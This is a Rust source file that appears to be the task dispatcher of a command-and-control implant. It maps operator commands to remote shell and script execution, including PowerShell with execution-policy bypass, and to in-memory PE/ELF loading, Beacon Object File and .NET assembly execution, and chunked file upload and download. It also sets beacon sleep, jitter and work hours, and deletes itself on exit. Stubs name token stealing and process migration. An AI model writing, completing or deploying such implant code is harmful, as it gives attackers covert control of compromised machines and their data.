//! Task dispatch.
//!
//! Port of `.execute()` and every verb. Verbs the Rust port has
//! not yet implemented return `"verb X not yet ported"` — the
//! dispatch structure is complete so a verb is a one-arm edit.
//!
//! `execute` runs the task under `task.timeout` (default 60s) as
//! `tokio::time::timeout`. The individual verb functions are
//! async because most either spawn a process or touch the
//! network; the few that are synchronous still return their
//! result through the timeout wrapper unchanged.

use std::process::Stdio;
use std::time::Duration;

use base64::Engine as _;
use tokio::process::Command;

use crate::native;
use crate::platform;
use crate::protocol::{Task, TaskResult};
use crate::verbs;

use super::agent::Agent;
use super::helpers::{
    encode_output, merge_streams, sanitized_env, split_script_args,
};
use super::identity::must_getwd;

// =====================================================================
// execute
// =====================================================================

impl Agent {
    pub async fn execute(&mut self, task: Task) -> TaskResult {
        let timeout_secs = if task.timeout <= 0 {
            60
        } else {
            task.timeout as u64
        };
        let id = task.id.clone();
        let fut = self.execute_inner(task);
        match tokio::time::timeout(
            Duration::from_secs(timeout_secs),
            fut,
        )
        .await
        {
            Ok(r) => r,
            Err(_) => TaskResult {
                id,
                error: Some(format!(
                    "task timed out after {timeout_secs}s"
                )),
                ..Default::default()
            },
        }
    }

    async fn execute_inner(&mut self, task: Task) -> TaskResult {
        // Native "extra" verbs (find, grep, ls, ps, ...) live in
        // `verbs/`. If the dispatcher returns a `Some`, it handled
        // the verb; otherwise fall through.
        if verbs::is_native_extra_verb(&task.verb) {
            return verbs::native_extra_verb(self, &task).await;
        }

        // Extension verbs (WASM). Stubbed until the wasm-host
        // feature lands.
        if matches!(
            task.verb.as_str(),
            "extension_register"
                | "extension_call"
                | "extension_list"
                | "extension_unload"
        ) {
            return TaskResult {
                id: task.id,
                error: Some(format!(
                    "verb {} not yet ported (WASM host)",
                    task.verb,
                )),
                ..Default::default()
            };
        }

        match task.verb.as_str() {
            // ---- Simple verbs ---------------------------------
            "pwd" => TaskResult {
                id: task.id,
                output: encode_output(must_getwd().as_bytes()),
                ..Default::default()
            },
            "whoami" => {
                if task.args.first().map(|s| s.as_str())
                    == Some("/priv")
                {
                    if !cfg!(target_os = "windows") {
                        return TaskResult {
                            id: task.id,
                            error: Some(
                                "whoami /priv is only available on Windows"
                                    .to_string(),
                            ),
                            ..Default::default()
                        };
                    }
                    return match native::whoami_priv(&task) {
                        Ok(out) => TaskResult {
                            id: task.id,
                            output: encode_output(out.as_bytes()),
                            ..Default::default()
                        },
                        Err(e) => TaskResult {
                            id: task.id,
                            error: Some(e.to_string()),
                            ..Default::default()
                        },
                    };
                }
                TaskResult {
                    id: task.id.clone(),
                    output: encode_output(
                        self.identity.username.as_bytes(),
                    ),
                    ..Default::default()
                }
            }
            "hostname" => TaskResult {
                id: task.id.clone(),
                output: encode_output(
                    self.identity.hostname.as_bytes(),
                ),
                ..Default::default()
            },
            "uname" => TaskResult {
                id: task.id,
                output: encode_output(
                    format!(
                        "{} {}",
                        std::env::consts::OS,
                        std::env::consts::ARCH,
                    )
                    .as_bytes(),
                ),
                ..Default::default()
            },
            "env" => TaskResult {
                id: task.id,
                output: encode_output(
                    sanitized_env().join("\n").as_bytes(),
                ),
                ..Default::default()
            },
            "cat" | "readfile" => self.cat_verb(&task).await,
            "ls" => self.ls_verb(&task).await,
            "ps" => self.ps_verb(&task).await,
            "id" => self.id_verb(&task).await,

            // ---- Scheduling -----------------------------------
            "sleep" => self.sleep_verb(&task).await,
            "workhours" => self.workhours_verb(&task).await,
            "spawnto" => self.spawnto_verb(&task).await,
            "kill" | "exit" => {
                let id = task.id.clone();
                tokio::spawn(async move {
                    tokio::time::sleep(Duration::from_secs(1)).await;
                    let _ = platform::self_delete();
                    std::process::exit(0);
                });
                TaskResult {
                    id,
                    output: encode_output(b"terminating\n"),
                    ..Default::default()
                }
            }

            // ---- Shell / script exec --------------------------
            "exec" => self.exec_verb(&task).await,
            "sh" => self.sh_verb(&task).await,
            "pyexec" => self.pyexec_verb(&task).await,
            "psexec" => self.psexec_verb(&task).await,
            "shexec" => self.shexec_verb(&task).await,

            // ---- Chunked file transfer ------------------------
            "truncate" => self.truncate_verb(&task).await,
            "writechunk" => self.writechunk_verb(&task).await,
            "readchunk" => self.readchunk_verb(&task).await,
            "filesize" => self.filesize_verb(&task).await,
            "sha256file" => self.sha256_file_verb(&task).await,

            // ---- In-memory execution --------------------------
            "execmem" => self.execmem_verb(&task).await,
            "bof" => self.bof_verb(&task).await,
            "execute_assembly" => self.execute_assembly_verb(&task).await,

            // ---- Pivot / migrate / cred -----------------------
            "pivot_connect" | "pivot_close" => TaskResult {
                id: task.id,
                error: Some(format!(
                    "verb {} not yet ported",
                    task.verb,
                )),
                ..Default::default()
            },
            "migrate" => self.migrate_verb(&task).await,
            "cred_validate" | "steal_token" => TaskResult {
                id: task.id,
                error: Some(format!(
                    "verb {} not yet ported",
                    task.verb,
                )),
                ..Default::default()
            },

            other => TaskResult {
                id: task.id,
                error: Some(format!("unknown verb: {other}")),
                ..Default::default()
            },
        }
    }

    // =================================================================
    // Simple verbs
    // =================================================================

    async fn cat_verb(&self, task: &Task) -> TaskResult {
        let path = match task.args.first() {
            Some(p) => p.clone(),
            None => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some("cat requires a path".to_string()),
                    ..Default::default()
                }
            }
        };
        match tokio::fs::read(&path).await {
            Ok(data) => TaskResult {
                id: task.id.clone(),
                output: encode_output(&data),
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    async fn ls_verb(&self, task: &Task) -> TaskResult {
        let path = task
            .args
            .first()
            .cloned()
            .unwrap_or_else(|| ".".to_string());
        let entries = match tokio::fs::read_dir(&path).await {
            Ok(e) => e,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                }
            }
        };
        let mut out = String::new();
        let mut entries = entries;
        while let Ok(Some(entry)) = entries.next_entry().await {
            out.push_str(&entry.file_name().to_string_lossy());
            out.push('\n');
        }
        TaskResult {
            id: task.id.clone(),
            output: encode_output(out.as_bytes()),
            ..Default::default()
        }
    }

    async fn ps_verb(&self, task: &Task) -> TaskResult {
        match native::native_ps().await {
            Ok(out) => TaskResult {
                id: task.id.clone(),
                output: encode_output(out.as_bytes()),
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    async fn id_verb(&self, task: &Task) -> TaskResult {
        match native::native_id().await {
            Ok(out) => TaskResult {
                id: task.id.clone(),
                output: encode_output(out.as_bytes()),
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    // =================================================================
    // Scheduling
    // =================================================================

    async fn sleep_verb(&mut self, task: &Task) -> TaskResult {
        let secs: i32 = task
            .args
            .first()
            .and_then(|s| s.parse().ok())
            .unwrap_or(-1);
        if secs < 0 {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "invalid interval (>= 0 required)".to_string(),
                ),
                ..Default::default()
            };
        }
        self.session.sleep = secs;
        if let Some(j) = task
            .args
            .get(1)
            .and_then(|s| s.parse::<f64>().ok())
        {
            self.session.jitter = j;
        }
        TaskResult {
            id: task.id.clone(),
            output: encode_output(
                format!(
                    "sleep={} jitter={:.2}\n",
                    self.session.sleep, self.session.jitter
                )
                .as_bytes(),
            ),
            ..Default::default()
        }
    }

    async fn workhours_verb(&mut self, task: &Task) -> TaskResult {
        // Read-only form.
        if task.args.is_empty() {
            let (s, e) = self.state.work_hours();
            return TaskResult {
                id: task.id.clone(),
                output: encode_output(
                    format!(
                        "workhours={}\n",
                        super::diag::format_work_hours(s, e)
                    )
                    .as_bytes(),
                ),
                ..Default::default()
            };
        }
        if task.args.len() == 1 {
            let arg = task.args[0].to_ascii_lowercase();
            if arg == "off" || arg == "disable" {
                self.state.update_schedule(
                    crate::protocol::ScheduleUpdates {
                        work_hours_start: Some(0),
                        work_hours_end: Some(0),
                        ..Default::default()
                    },
                );
                return TaskResult {
                    id: task.id.clone(),
                    output: encode_output(b"workhours=off\n"),
                    ..Default::default()
                };
            }
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "workhours <start> <end> | workhours off".to_string(),
                ),
                ..Default::default()
            };
        }
        let start = super::diag::parse_clock(&task.args[0]);
        let end = super::diag::parse_clock(&task.args[1]);
        let (Some(start), Some(end)) = (start, end) else {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "invalid clock format, expected HH:MM".to_string(),
                ),
                ..Default::default()
            };
        };
        self.state.update_schedule(
            crate::protocol::ScheduleUpdates {
                work_hours_start: Some(start),
                work_hours_end: Some(end),
                ..Default::default()
            },
        );
        TaskResult {
            id: task.id.clone(),
            output: encode_output(
                format!(
                    "workhours={}\n",
                    super::diag::format_work_hours(start, end)
                )
                .as_bytes(),
            ),
            ..Default::default()
        }
    }

    async fn spawnto_verb(&mut self, task: &Task) -> TaskResult {
        if task.args.is_empty() {
            let cur = self
                .spawn_to
                .clone()
                .unwrap_or_else(|| "<default>".to_string());
            return TaskResult {
                id: task.id.clone(),
                output: encode_output(
                    format!("spawnto={cur}\n").as_bytes(),
                ),
                ..Default::default()
            };
        }
        let v = task.args[0].trim().to_string();
        if v.is_empty() || v == "-" {
            self.spawn_to = None;
            return TaskResult {
                id: task.id.clone(),
                output: encode_output(b"spawnto=<default>\n"),
                ..Default::default()
            };
        }
        if v.len() > 512 {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "spawnto path is too long (max 512 characters)"
                        .to_string(),
                ),
                ..Default::default()
            };
        }
        if v.contains(['\r', '\n', '\0']) {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "spawnto path contains control bytes".to_string(),
                ),
                ..Default::default()
            };
        }
        self.spawn_to = Some(v.clone());
        TaskResult {
            id: task.id.clone(),
            output: encode_output(
                format!("spawnto={v}\n").as_bytes(),
            ),
            ..Default::default()
        }
    }

    // =================================================================
    // Shell / script exec
    // =================================================================

    async fn exec_verb(&self, task: &Task) -> TaskResult {
        if task.args.is_empty() {
            return TaskResult {
                id: task.id.clone(),
                error: Some("exec requires a command".to_string()),
                ..Default::default()
            };
        }
        let mut cmd = Command::new(&task.args[0]);
        for a in &task.args[1..] {
            cmd.arg(a);
        }
        cmd.envs(sanitized_env());
        cmd.stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        match cmd.output().await {
            Ok(o) => {
                let mut out = o.stdout;
                out.extend_from_slice(&o.stderr);
                TaskResult {
                    id: task.id.clone(),
                    output: encode_output(&out),
                    exit_code: o.status.code().unwrap_or(-1),
                    ..Default::default()
                }
            }
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    async fn sh_verb(&self, task: &Task) -> TaskResult {
        if task.args.is_empty() {
            return TaskResult {
                id: task.id.clone(),
                error: Some("sh requires a command".to_string()),
                ..Default::default()
            };
        }
        let command = task.args.join(" ");
        let (shell, args): (&str, Vec<&str>) = if cfg!(windows) {
            ("cmd.exe", vec!["/Q"])
        } else {
            ("/bin/sh", vec!["-s"])
        };
        let mut cmd = Command::new(shell);
        for a in &args {
            cmd.arg(a);
        }
        cmd.envs(sanitized_env());
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                }
            }
        };
        if let Some(mut stdin) = child.stdin.take() {
            use tokio::io::AsyncWriteExt;
            let _ = stdin.write_all(command.as_bytes()).await;
            let _ = stdin.write_all(b"\n").await;
        }
        match child.wait_with_output().await {
            Ok(o) => {
                let mut out = o.stdout;
                out.extend_from_slice(&o.stderr);
                TaskResult {
                    id: task.id.clone(),
                    output: encode_output(&out),
                    exit_code: o.status.code().unwrap_or(-1),
                    ..Default::default()
                }
            }
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    async fn pyexec_verb(&self, task: &Task) -> TaskResult {
        self.script_verb(task, ScriptKind::Python).await
    }

    async fn psexec_verb(&self, task: &Task) -> TaskResult {
        if !cfg!(target_os = "windows") {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "psexec requires a Windows target".to_string(),
                ),
                ..Default::default()
            };
        }
        self.script_verb(task, ScriptKind::Powershell).await
    }

    async fn shexec_verb(&self, task: &Task) -> TaskResult {
        self.script_verb(task, ScriptKind::Shell).await
    }

    async fn script_verb(
        &self,
        task: &Task,
        kind: ScriptKind,
    ) -> TaskResult {
        let Some(first) = task.args.first() else {
            return TaskResult {
                id: task.id.clone(),
                error: Some(format!(
                    "{} requires base64-encoded source as first arg",
                    kind.verb_name(),
                )),
                ..Default::default()
            };
        };
        let src = match base64::engine::general_purpose::STANDARD
            .decode(first)
        {
            Ok(s) => s,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(format!(
                        "invalid base64 in first arg: {e}"
                    )),
                    ..Default::default()
                }
            }
        };
        let script_args = split_script_args(&task.args);

        let (prog, argv): (String, Vec<String>) = match kind {
            ScriptKind::Python => {
                let prog = if which_program("python3").is_some() {
                    "python3".to_string()
                } else if which_program("python").is_some() {
                    "python".to_string()
                } else {
                    return TaskResult {
                        id: task.id.clone(),
                        error: Some(
                            "python3/python not found on target"
                                .to_string(),
                        ),
                        ..Default::default()
                    };
                };
                let mut argv = vec!["-".to_string()];
                argv.extend(script_args);
                (prog, argv)
            }
            ScriptKind::Powershell => {
                let mut argv = vec![
                    "-NoProfile".to_string(),
                    "-NoLogo".to_string(),
                    "-NonInteractive".to_string(),
                    "-ExecutionPolicy".to_string(),
                    "Bypass".to_string(),
                    "-Command".to_string(),
                    "-".to_string(),
                ];
                argv.extend(script_args);
                ("powershell.exe".to_string(), argv)
            }
            ScriptKind::Shell => {
                if cfg!(windows) {
                    // Windows: preamble sets %1..%9 from args.
                    let mut body = String::new();
                    for (i, arg) in script_args.iter().take(9).enumerate()
                    {
                        body.push_str(&format!(
                            "set \"{}={}\"\n",
                            i + 1,
                            arg.replace('%', "%%"),
                        ));
                    }
                    body.push_str(
                        &String::from_utf8_lossy(&src),
                    );
                    let mut argv = vec!["/Q".to_string()];
                    argv.push("-c".to_string());
                    argv.push(body);
                    ("cmd.exe".to_string(), argv)
                } else {
                    let mut argv = vec!["-s".to_string()];
                    argv.extend(script_args);
                    ("/bin/sh".to_string(), argv)
                }
            }
        };

        let mut cmd = Command::new(&prog);
        for a in &argv {
            cmd.arg(a);
        }
        cmd.envs(sanitized_env());
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                }
            }
        };
        if let Some(mut stdin) = child.stdin.take() {
            use tokio::io::AsyncWriteExt;
            let _ = stdin.write_all(&src).await;
        }
        match child.wait_with_output().await {
            Ok(o) => TaskResult {
                id: task.id.clone(),
                output: encode_output(&merge_streams(
                    &o.stdout, &o.stderr,
                )),
                exit_code: o.status.code().unwrap_or(-1),
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    // =================================================================
    // Chunked file transfer
    // =================================================================

    async fn truncate_verb(&self, task: &Task) -> TaskResult {
        let Some(path) = task.args.first() else {
            return TaskResult {
                id: task.id.clone(),
                error: Some("truncate requires a path".to_string()),
                ..Default::default()
            };
        };
        match tokio::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(path)
            .await
        {
            Ok(_) => TaskResult {
                id: task.id.clone(),
                output: encode_output(b"truncated\n"),
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    async fn writechunk_verb(&self, task: &Task) -> TaskResult {
        if task.args.len() < 2 {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "writechunk requires <b64_data> <remote_path>"
                        .to_string(),
                ),
                ..Default::default()
            };
        }
        let data = match base64::engine::general_purpose::STANDARD
            .decode(&task.args[0])
        {
            Ok(d) => d,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(format!("invalid base64: {e}")),
                    ..Default::default()
                }
            }
        };
        let path = &task.args[1];
        use tokio::io::AsyncWriteExt;
        let mut f = match tokio::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .append(true)
            .open(path)
            .await
        {
            Ok(f) => f,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                }
            }
        };
        if let Err(e) = f.write_all(&data).await {
            return TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            };
        }
        TaskResult {
            id: task.id.clone(),
            output: String::new(),
            ..Default::default()
        }
    }

    async fn readchunk_verb(&self, task: &Task) -> TaskResult {
        if task.args.len() < 3 {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "readchunk requires <path> <offset> <size>"
                        .to_string(),
                ),
                ..Default::default()
            };
        }
        let offset: u64 = match task.args[1].parse() {
            Ok(o) => o,
            Err(_) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some("invalid offset".to_string()),
                    ..Default::default()
                }
            }
        };
        let size: u64 = match task.args[2].parse() {
            Ok(s) if s > 0 && s <= 16 * 1024 * 1024 => s,
            _ => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(
                        "invalid size (must be 1..16777216)"
                            .to_string(),
                    ),
                    ..Default::default()
                }
            }
        };
        use tokio::io::{AsyncReadExt, AsyncSeekExt};
        let mut f = match tokio::fs::File::open(&task.args[0]).await {
            Ok(f) => f,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                }
            }
        };
        if let Err(e) =
            f.seek(std::io::SeekFrom::Start(offset)).await
        {
            return TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            };
        }
        let mut buf = vec![0u8; size as usize];
        let n = match f.read(&mut buf).await {
            Ok(n) => n,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                }
            }
        };
        TaskResult {
            id: task.id.clone(),
            output: encode_output(&buf[..n]),
            ..Default::default()
        }
    }

    async fn filesize_verb(&self, task: &Task) -> TaskResult {
        let Some(path) = task.args.first() else {
            return TaskResult {
                id: task.id.clone(),
                error: Some("filesize requires a path".to_string()),
                ..Default::default()
            };
        };
        match tokio::fs::metadata(path).await {
            Ok(m) if m.is_file() => TaskResult {
                id: task.id.clone(),
                output: encode_output(m.len().to_string().as_bytes()),
                ..Default::default()
            },
            Ok(_) => TaskResult {
                id: task.id.clone(),
                error: Some("path is a directory".to_string()),
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    async fn sha256_file_verb(&self, task: &Task) -> TaskResult {
        let Some(path) = task.args.first() else {
            return TaskResult {
                id: task.id.clone(),
                error: Some("sha256file requires a path".to_string()),
                ..Default::default()
            };
        };
        use sha2::{Digest, Sha256};
        use tokio::io::AsyncReadExt;
        let mut f = match tokio::fs::File::open(path).await {
            Ok(f) => f,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                }
            }
        };
        let mut h = Sha256::new();
        let mut buf = [0u8; 8192];
        loop {
            match f.read(&mut buf).await {
                Ok(0) => break,
                Ok(n) => h.update(&buf[..n]),
                Err(e) => {
                    return TaskResult {
                        id: task.id.clone(),
                        error: Some(e.to_string()),
                        ..Default::default()
                    }
                }
            }
        }
        TaskResult {
            id: task.id.clone(),
            output: encode_output(
                hex::encode(h.finalize()).as_bytes(),
            ),
            ..Default::default()
        }
    }

    // =================================================================
    // In-memory execution
    // =================================================================

    async fn execmem_verb(&self, task: &Task) -> TaskResult {
        if task.args.len() < 2 {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "execmem requires <remote_path> <kind> [args...]"
                        .to_string(),
                ),
                ..Default::default()
            };
        }
        let path = task.args[0].clone();
        let kind = task.args[1].to_ascii_lowercase();
        let payload_args = &task.args[2..];
        match kind.as_str() {
            "exe" => match native::exec_pe_in_memory(&path, payload_args).await {
                Ok((out, code)) => TaskResult {
                    id: task.id.clone(),
                    output: encode_output(out.as_bytes()),
                    exit_code: code,
                    ..Default::default()
                },
                Err(e) => TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                },
            },
            "elf" => match native::exec_elf_in_memory(&path, payload_args).await {
                Ok((out, code)) => TaskResult {
                    id: task.id.clone(),
                    output: encode_output(out.as_bytes()),
                    exit_code: code,
                    ..Default::default()
                },
                Err(e) => TaskResult {
                    id: task.id.clone(),
                    error: Some(e.to_string()),
                    ..Default::default()
                },
            },
            other => TaskResult {
                id: task.id.clone(),
                error: Some(format!("unknown payload kind: {other}")),
                ..Default::default()
            },
        }
    }

    async fn bof_verb(&self, task: &Task) -> TaskResult {
        if task.args.is_empty() {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "bof requires base64-encoded COFF as first arg"
                        .to_string(),
                ),
                ..Default::default()
            };
        }
        let coff = match base64::engine::general_purpose::STANDARD
            .decode(&task.args[0])
        {
            Ok(c) => c,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(format!(
                        "invalid base64 COFF: {e}"
                    )),
                    ..Default::default()
                }
            }
        };
        let entry = task.args.get(1).cloned().unwrap_or_default();
        let packed = if let Some(a) = task.args.get(2) {
            if a.is_empty() {
                Vec::new()
            } else {
                match base64::engine::general_purpose::STANDARD
                    .decode(a)
                {
                    Ok(v) => v,
                    Err(e) => {
                        return TaskResult {
                            id: task.id.clone(),
                            error: Some(format!(
                                "invalid base64 args: {e}"
                            )),
                            ..Default::default()
                        }
                    }
                }
            }
        } else {
            Vec::new()
        };
        match native::exec_bof(&coff, &entry, &packed).await {
            Ok((out, code)) => TaskResult {
                id: task.id.clone(),
                output: encode_output(out.as_bytes()),
                exit_code: code,
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    async fn execute_assembly_verb(&self, task: &Task) -> TaskResult {
        if !cfg!(target_os = "windows") {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "execute_assembly requires a Windows target"
                        .to_string(),
                ),
                ..Default::default()
            };
        }
        if task.args.is_empty() {
            return TaskResult {
                id: task.id.clone(),
                error: Some(
                    "execute_assembly requires base64-encoded \
                     assembly as first arg"
                        .to_string(),
                ),
                ..Default::default()
            };
        }
        let asm = match base64::engine::general_purpose::STANDARD
            .decode(&task.args[0])
        {
            Ok(a) => a,
            Err(e) => {
                return TaskResult {
                    id: task.id.clone(),
                    error: Some(format!(
                        "invalid base64 assembly: {e}"
                    )),
                    ..Default::default()
                }
            }
        };
        let args_string =
            task.args.get(1).cloned().unwrap_or_default();
        let spawn_to = self.spawn_to.clone().unwrap_or_default();
        match platform::exec_assembly_out_of_process(
            &asm,
            &args_string,
            &spawn_to,
        )
        .await
        {
            Ok((out, code)) => TaskResult {
                id: task.id.clone(),
                output: encode_output(out.as_bytes()),
                exit_code: code,
                ..Default::default()
            },
            Err(e) => TaskResult {
                id: task.id.clone(),
                error: Some(e.to_string()),
                ..Default::default()
            },
        }
    }

    // =================================================================
    // migrate (stub — module not yet ported)
    // =================================================================

    async fn migrate_verb(&self, task: &Task) -> TaskResult {
        TaskResult {
            id: task.id.clone(),
            error: Some("migrate verb not yet ported".to_string()),
            ..Default::default()
        }
    }
}

// =====================================================================
// Helpers
// =====================================================================

#[derive(Clone, Copy)]
enum ScriptKind {
    Python,
    Powershell,
    Shell,
}

impl ScriptKind {
    fn verb_name(self) -> &'static str {
        match self {
            Self::Python => "pyexec",
            Self::Powershell => "psexec",
            Self::Shell => "shexec",
        }
    }
}

fn which_program(name: &str) -> Option<std::path::PathBuf> {
    let path = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path) {
        let candidate = dir.join(name);
        if candidate.is_file() {
            return Some(candidate);
        }
    }
    None
}